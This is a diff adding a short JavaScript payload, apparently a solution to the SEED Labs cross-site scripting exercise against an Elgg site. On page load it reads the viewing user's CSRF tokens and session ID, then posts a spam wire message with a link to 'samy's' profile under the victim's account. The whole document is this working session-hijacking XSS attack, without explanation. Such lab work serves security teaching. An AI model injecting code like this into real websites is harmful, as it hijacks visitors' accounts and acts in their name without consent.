@@ -1,0 +1,22 @@
+window.onload = function(){
+    var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	var owner_id=elgg.page_owner.guid;
+	var visitor_id=elgg.session.user.guid;
+
+    var body="&body=To earn 12 USD/hour(!), <a href='http://www.seed-server.com/profile/samy'>Visit Now</a> <br> http://www.seed-server.com/profile/samy";
+	var content=token+ts+body; //FILL IN
+	
+	
+	if(owner_id!=visitor_id)
+	{
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+}
